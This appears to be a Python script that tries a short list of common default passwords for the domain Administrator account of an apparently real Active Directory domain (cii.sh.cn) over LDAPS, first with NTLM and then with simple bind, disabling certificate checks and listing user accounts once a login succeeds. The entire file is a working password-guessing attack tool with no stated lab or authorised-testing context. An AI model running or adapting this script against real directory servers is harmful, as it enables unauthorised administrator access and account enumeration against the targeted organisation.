from ldap3 import Server, Connection, ALL, NTLM, Tls
import ssl
import sys

server = Server('******', get_info=ALL, use_ssl=True, port=636,
                tls=Tls(validate=ssl.CERT_NONE))

credentials = [
    ('cii.sh.cn\\Administrator', 'Admin@123'),
    ('cii.sh.cn\\Administrator', 'P@ssw0rd'),
    ('cii.sh.cn\\Administrator', 'Aa123456!'),
]

for user, pwd in credentials:
    try:
        conn = Connection(server, user=user, password=pwd, authentication=NTLM, auto_bind=True)
        print(f"LDAPS+NTLM SUCCESS: {user} / {pwd}")
        conn.search('DC=cii,DC=sh,DC=cn', '(objectClass=user)', attributes=['sAMAccountName'], size_limit=5)
        print(f"  Users found: {len(conn.entries)}")
        conn.unbind()
        sys.exit(0)
    except Exception as ex:
        print(f"LDAPS+NTLM FAILED: {user} / {pwd} -> {ex}")

print("\nTrying LDAPS simple bind...")
for user_fmt, pwd in [('Administrator@cii.sh.cn', 'Admin@123'), ('cn=Administrator,cn=Users,dc=cii,dc=sh,dc=cn', 'Admin@123')]:
    try:
        conn = Connection(server, user=user_fmt, password=pwd, auto_bind=True)
        print(f"LDAPS SIMPLE SUCCESS: {user_fmt} / {pwd}")
        conn.unbind()
        sys.exit(0)
    except Exception as ex:
        print(f"LDAPS SIMPLE FAILED: {user_fmt} / {pwd} -> {ex}")